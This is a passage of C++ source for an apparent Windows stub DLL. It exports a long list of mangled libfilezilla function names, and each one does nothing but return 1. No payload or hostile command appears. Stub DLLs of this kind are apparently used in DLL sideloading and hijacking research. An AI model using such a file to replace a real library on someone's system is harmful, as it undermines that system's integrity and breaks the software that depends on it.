BOOL WINAPI _ZN2fz17normalize_hyphensB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17socket_descriptorD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17socket_descriptorD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17str_tolower_asciiB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17str_tolower_asciiB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17str_toupper_asciiB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17str_toupper_asciiB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18get_ipv6_long_formB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18get_ipv6_long_formB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18get_unique_type_idERKSt9type_info() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18get_version_stringB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18jws_sign_flattenedERKNS_4jsonES2_S2_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18pbkdf2_hmac_sha256ERKSt17basic_string_viewIhSt11char_traitsIhEES5_yj() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_manager15record_activityEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_manager19set_burst_toleranceEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_manager3addEPNS_12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_manager7processEPNS_12rate_limiterEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_manager8on_timerERKy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_managerC1ERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_managerC2ERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_managerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_managerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_managerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limit_managerclERKNS_10event_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layer17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layer4readEPvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layer5writeEPKvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layer6wakeupENS_9direction4typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layerC1EPNS_13event_handlerERNS_16socket_interfaceEPNS_12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layerC2EPNS_13event_handlerERNS_16socket_interfaceEPNS_12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18rate_limited_layerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18replace_substringsERNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERKSt17basic_string_viewIcS3_ESA_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18replace_substringsERNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEcc() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18replace_substringsERNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERKSt17basic_string_viewIwS3_ESA_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz18replace_substringsERNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEww() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19get_invoker_factoryERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenC1EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenC1ERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEES8_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenC1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenC2EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenC2ERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEES8_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenC2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19impersonation_tokenaSEOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19is_routable_addressERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19is_routable_addressERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19private_signing_key11from_base64ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19private_signing_key8generateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19replaced_substringsB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEES5_S5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19replaced_substringsB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEEcc() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19replaced_substringsB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEES5_S5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19replaced_substringsB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEEww() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz19socket_error_stringB5cxx11Ei() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz20base64_encode_appendERNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERKSt17basic_string_viewIcS3_ENS_11base64_typeEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz20remove_socket_eventsEPNS_13event_handlerEPKNS_19socket_event_sourceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz20to_wstring_from_utf8B5cxx11EPKcy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz20to_wstring_from_utf8B5cxx11ERKNS_6bufferE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz20to_wstring_from_utf8B5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz22load_certificates_fileERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEbbPNS_16logger_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz22spawn_detached_processERKSt6vectorINSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEESaIS6_EE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz22tls_system_trust_storeC1ERNS_11thread_poolE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz22tls_system_trust_storeC2ERNS_11thread_poolE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz22tls_system_trust_storeD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz22tls_system_trust_storeD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz23public_verification_key11from_base64ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz24socket_error_descriptionB5cxx11Ei() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27change_socket_event_handlerEPNS_13event_handlerES1_PKNS_19socket_event_sourceENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layer11add_limiterEPNS_12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layer14remove_limiterEPNS_12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layer17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layer4readEPvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layer5writeEPKvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layerC1EPNS_13event_handlerERNS_16socket_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layerC2EPNS_13event_handlerERNS_16socket_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz27compound_rate_limited_layerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3md5ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3md5ERKSt6vectorIhSaIhEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3uri15parse_authorityESt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3uri5clearEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3uri5parseESt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3uri7resolveERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3uriC1ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz3uriC2ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file4openERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEENS0_4modeENS0_14creation_flagsE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file4readEPvx() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file4seekExNS0_9seek_modeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file5closeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file5fsyncEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file5writeEPKvx() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file6detachEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4file8truncateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileC1EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileC1EPv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileC1ERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEENS0_4modeENS0_14creation_flagsE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileC2EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileC2EPv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileC2ERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEENS0_4modeENS0_14creation_flagsE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4fileaSEOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json10check_typeENS_9json_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json5clearEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json5eraseERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json5parseERKNS_6bufferEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json5parseERKSt17basic_string_viewIcSt11char_traitsIcEEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json5parseERPKcS2_y() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4json8set_typeENS_9json_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4jsonaSEOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4jsonaSERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4jsonaSERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4jsonixERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4jsonixEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4signEPKhyRKNS_19private_signing_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4signERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_19private_signing_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz4signERKSt6vectorIhSaIhEERKNS_19private_signing_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mkdirERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEbNS_17mkdir_permissionsEPS5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutex4lockEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutex6unlockEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutex8try_lockEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutexC1Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutexC2Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutexD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5mutexD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5sleepERKNS_8durationE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz5yieldEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket10add_tokensENS_9direction4typeEyy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket11unlock_treeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket12update_statsERb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket13remove_bucketEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket19distribute_overflowENS_9direction4typeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket26gather_unspent_for_removalEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket7consumeENS_9direction4typeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket7waitingERNS_11scoped_lockENS_9direction4typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucket9availableENS_9direction4typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucketD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucketD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bucketD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer3addEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer3getEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer5clearEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer6appendEPKhy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer6appendERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer6appendERKSt6vectorIhSaIhEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer6appendEh() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer6resizeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer7consumeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6buffer7reserveEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferC1EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferC1ERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferC1Ey() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferC2EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferC2ERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferC2Ey() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferaSEOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6bufferaSERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6sha256ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6sha256ERKSt6vectorIhSaIhEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket14get_descriptorEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket15from_descriptorEONS_17socket_descriptorERNS_11thread_poolERiPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket22ideal_send_buffer_sizeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket22set_keepalive_intervalERKNS_8durationE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket4readEPvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket5writeEPKvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket7connectERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEjNS_12address_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket8shutdownEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket9set_flagsEi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socket9set_flagsEib() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socketC1ERNS_11thread_poolEPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socketC2ERNS_11thread_poolEPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socketD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socketD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6socketD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6strtokB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEES5_b() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6strtokB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEEcb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6strtokB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEES5_b() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6strtokB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEEwb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6thread3runEOSt8functionIFvvEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6thread4joinEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6thread6own_idEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6threadD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6threadD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6verifyEPKhyRKNS_23public_verification_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6verifyEPKhyS1_yRKNS_23public_verification_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6verifyERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_23public_verification_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6verifyERKSt17basic_string_viewIcSt11char_traitsIcEES5_RKNS_23public_verification_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6verifyERKSt6vectorIhSaIhEERKNS_23public_verification_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz6verifyERKSt6vectorIhSaIhEES4_RKNS_23public_verification_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7bitscanEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptEPKhyRKNS_11private_keyES1_y() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptEPKhyRKNS_11private_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptEPKhyRKNS_13symmetric_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptEPKhyRKNS_13symmetric_keyES1_y() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_11private_keyES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_11private_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_13symmetric_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_13symmetric_keyES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt6vectorIhSaIhEERKNS_11private_keyES4_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt6vectorIhSaIhEERKNS_11private_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt6vectorIhSaIhEERKNS_13symmetric_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7decryptERKSt6vectorIhSaIhEERKNS_13symmetric_keyES4_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptEPKhyRKNS_10public_keyES1_y() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptEPKhyRKNS_10public_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptEPKhyRKNS_13symmetric_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptEPKhyRKNS_13symmetric_keyES1_y() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_10public_keyES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_10public_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_13symmetric_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt17basic_string_viewIcSt11char_traitsIcEERKNS_13symmetric_keyES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt6vectorIhSaIhEERKNS_10public_keyES4_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt6vectorIhSaIhEERKNS_10public_keyEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt6vectorIhSaIhEERKNS_13symmetric_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7encryptERKSt6vectorIhSaIhEERKNS_13symmetric_keyES4_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7process4killEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7process4readEPcj() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7process5spawnERKNS_19impersonation_tokenERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERKSt6vectorIS9_SaIS9_EEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7process5spawnERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERKSt6vectorIS6_SaIS6_EEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7process5spawnERKSt6vectorINSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEESaIS7_EEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7process5writeEPKcj() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7processC1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7processC2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7processD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7processD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7stricmpERKSt17basic_string_viewIcSt11char_traitsIcEES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7stricmpERKSt17basic_string_viewIwSt11char_traitsIwEES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7to_utf8B5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
